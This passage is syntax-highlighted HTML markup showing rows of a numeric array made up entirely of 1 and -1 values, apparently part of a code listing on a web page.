class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span 